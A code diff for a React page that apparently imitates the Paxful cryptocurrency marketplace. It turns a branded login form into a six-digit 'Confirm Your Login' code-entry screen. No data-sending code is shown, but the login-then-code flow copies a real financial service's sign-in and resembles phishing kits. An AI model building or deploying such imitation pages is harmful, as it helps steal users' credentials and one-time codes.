@@ -12,7 +12,7 @@ export default function Home() {
   return (
    //paxfull login page
     <main className="flex items-center  content-evenly ">
-        <div className="flex flex-col items-start justify-center w-full max-w-md p-3 lg:ml-10 mx-auto mt-8 lg:mt-16 bg-white ">
+        <div className="flex flex-col items-start justify-center w-full max-w-md p-3  mx-auto mt-8 lg:mt-16 bg-white ">
             <div className="flex w-full items-center justify-between">
                 <svg width="121" height="24" viewBox="0 0 121 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                     <g clip-path="url(#clip0_1_64)">
@@ -38,57 +38,37 @@ export default function Home() {
             </div>
 
             <div className="flex flex-col gap-6 mt-7 justify-start items-start">
-                <p className="text-2xl text-purple-900 font-bold">Log In With Paxful</p>
-                <img src="/div.alert.svg" alt="paxful" className="w-70 hidden md:block " />
-                <img src="/alert.svg" alt="paxful" className="w-70 md:hidden" />
+                <p className="text-2xl text-black font-bold">Confirm Your Login</p>
             </div>
 
             <div className="flex flex-col gap-4 mt-6 justify-start w-full items-start">
                 <div className="flex flex-col justify-start w-full items-start space-y-2">
-                    <label className="text-sm text-black">Your Phone or Email</label>
-                    <input type="text" className="w-full border focus:border-[#42a4d1] outline-none rounded-sm p-2" />
+                    <label className="text-sm text-black ">Enter the code we've sent to your email below.</label>
+                    <a href="#" className="text-sm text-[#0052CC]">Trouble logging in?</a>
                 </div>
 
                 <div className="flex flex-col justify-start w-full items-start space-y-2">
-                    <div className="flex items-center justify-between w-full">
-                        <label className="text-sm text-black">Password</label>
-                        <a href="#" className="text-sm text-[#0052CC]">Forgot Password?</a>
+                    <div className="flex items-center gap-3 justify-evenly w-full">
+                        <input type="text" className="w-full border focus:border-[#42a4d1] outline-none rounded-sm p-2 " />
+                        <input type="text" className="w-full border focus:border-[#42a4d1] outline-none rounded-sm p-2 " />
+                        <input type="text" className="w-full border focus:border-[#42a4d1] outline-none rounded-sm p-2 " />
+                        <input type="text" className="w-full border focus:border-[#42a4d1] outline-none rounded-sm p-2 " />
+                        <input type="text" className="w-full border focus:border-[#42a4d1] outline-none rounded-sm p-2 " />
+                        <input type="text" className="w-full border focus:border-[#42a4d1] outline-none rounded-sm p-2 " />
                     </div>
-                    <div className="relative w-full">
-                        <div className="flex items-center justify-between w-full">
-                            <input type={toggle} className="w-full border focus:border-[#42a4d1] outline-none rounded-sm p-2 " />
-                            <svg onClick={toggleText} className="absolute cursor-pointer right-6" width="17" height="10" viewBox="0 0 17 10" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M2.53 5.006L2.527 5L2.53 4.994C2.6108 4.84751 2.70701 4.71006 2.817 4.584C3.105 4.24 3.547 3.831 4.117 3.439C5.262 2.65 6.818 2 8.5 2C10.18 2 11.735 2.656 12.881 3.448C13.3633 3.77256 13.8013 4.15846 14.184 4.596C14.326 4.766 14.418 4.903 14.469 5C14.3878 5.14388 14.2923 5.27923 14.184 5.404C13.8013 5.84154 13.3633 6.22744 12.881 6.552C11.735 7.344 10.18 8 8.5 8C6.818 8 5.262 7.35 4.117 6.561C3.547 6.169 3.105 5.761 2.817 5.417C2.70729 5.29072 2.6111 5.15331 2.53 5.007V5.006ZM8.5 0C6.316 0 4.372 0.836 2.983 1.79C2.287 2.27 1.704 2.797 1.283 3.3C1.07939 3.53732 0.902339 3.79619 0.755 4.072C0.628 4.317 0.5 4.642 0.5 5C0.5 5.358 0.628 5.683 0.755 5.928C0.89 6.188 1.073 6.45 1.283 6.7C1.704 7.203 2.287 7.73 2.983 8.21C4.372 9.163 6.316 10 8.5 10C10.686 10 12.631 9.156 14.018 8.198C14.714 7.718 15.296 7.19 15.716 6.69C15.926 6.44 16.108 6.182 16.243 5.924C16.369 5.684 16.5 5.359 16.5 5C16.5 4.641 16.37 4.316 16.243 4.076C16.095 3.80271 15.9183 3.54594 15.716 3.31C15.296 2.81 14.714 2.283 14.018 1.802C12.631 0.844 10.686 0 8.5 0ZM8.5 7C9.03043 7 9.53914 6.78929 9.91421 6.41421C10.2893 6.03914 10.5 5.53043 10.5 5C10.5 4.46957 10.2893 3.96086 9.91421 3.58579C9.53914 3.21071 9.03043 3 8.5 3C7.96957 3 7.46086 3.21071 7.08579 3.58579C6.71071 3.96086 6.5 4.46957 6.5 5C6.5 5.53043 6.71071 6.03914 7.08579 6.41421C7.46086 6.78929 7.96957 7 8.5 7Z" fill="#626262"/>
-                            </svg>
-                        </div>
-                    </div>
+                    <a href="#" className="text-sm text-[#0052CC]">Resend Code</a>
                 </div>
 
-                <button
-                onClick={() => window.location.href='/confirm'} 
-                className="w-full bg-[#00A5EF] hover:bg-[#42a4d1] flex items-center justify-between text-white rounded-sm p-4 mt-2">
-                    Log In
-                    <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <button className="w-full bg-[#ffffff] flex items-center justify-start gap-3 text-[#0052CC] rounded-sm mt-2">
+                    <svg className='rotate-180 color-[#42a4d1]' width="9" height="16" stroke="#42a4d1" stroke-width="1.5" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                         <path fill-rule="evenodd" clip-rule="evenodd" d="M0.793997 13.292L6.086 7.99898L0.793997 2.70598C0.698487 2.61374 0.622304 2.50339 0.569895 2.38139C0.517486 2.25938 0.4899 2.12816 0.488746 1.99538C0.487592 1.8626 0.512894 1.73092 0.563175 1.60803C0.613456 1.48513 0.687709 1.37348 0.781602 1.27959C0.875495 1.18569 0.987146 1.11144 1.11004 1.06116C1.23294 1.01088 1.36462 0.985578 1.4974 0.986732C1.63018 0.987886 1.7614 1.01547 1.8834 1.06788C2.00541 1.12029 2.11575 1.19647 2.208 1.29198L8.208 7.29198C8.35276 7.43587 8.44951 7.62099 8.485 7.82198L8.5 7.93998V8.05798C8.48594 8.30241 8.38234 8.53309 8.209 8.70598L2.209 14.706C2.11675 14.8015 2.00641 14.8777 1.8844 14.9301C1.7624 14.9825 1.63118 15.0101 1.4984 15.0112C1.36562 15.0124 1.23394 14.9871 1.11104 14.9368C0.988146 14.8865 0.876495 14.8123 0.782602 14.7184C0.688709 14.6245 0.614456 14.5128 0.564175 14.3899C0.513894 14.267 0.488592 14.1354 0.489746 14.0026C0.4909 13.8698 0.518486 13.7386 0.570895 13.6166C0.623304 13.4946 0.698487 13.3842 0.793997 13.292Z" fill="white"/>
                     </svg>
+                    Back to login
                 </button>
-                {/* gray linevdr */}
-                <div className="flex items-center justify-center w-full mt-2">
-                    <div className="w-full h-px bg-gray-300"></div>
-                </div>
-                <div className="flex items-center justify-between w-full mt-2">
-                    <div className="flex items-center justify-center space-x-2">
-                        <label className="text-sm text-black">New on paxful?</label>
-                    </div>
-                    <a href="#" className="text-sm text-[#0052CC]">Create an Account?</a>
-                </div>
+                
             </div>
                     
             
-        </div>
-        {/* image */}
-        <div className="lg:flex flex-col hidden items-center justify-center w-full max-w-md p-2 mx-auto bg-white ">
-            <img src="/log.webp" alt="paxful" />
         </div>
     </main>
 
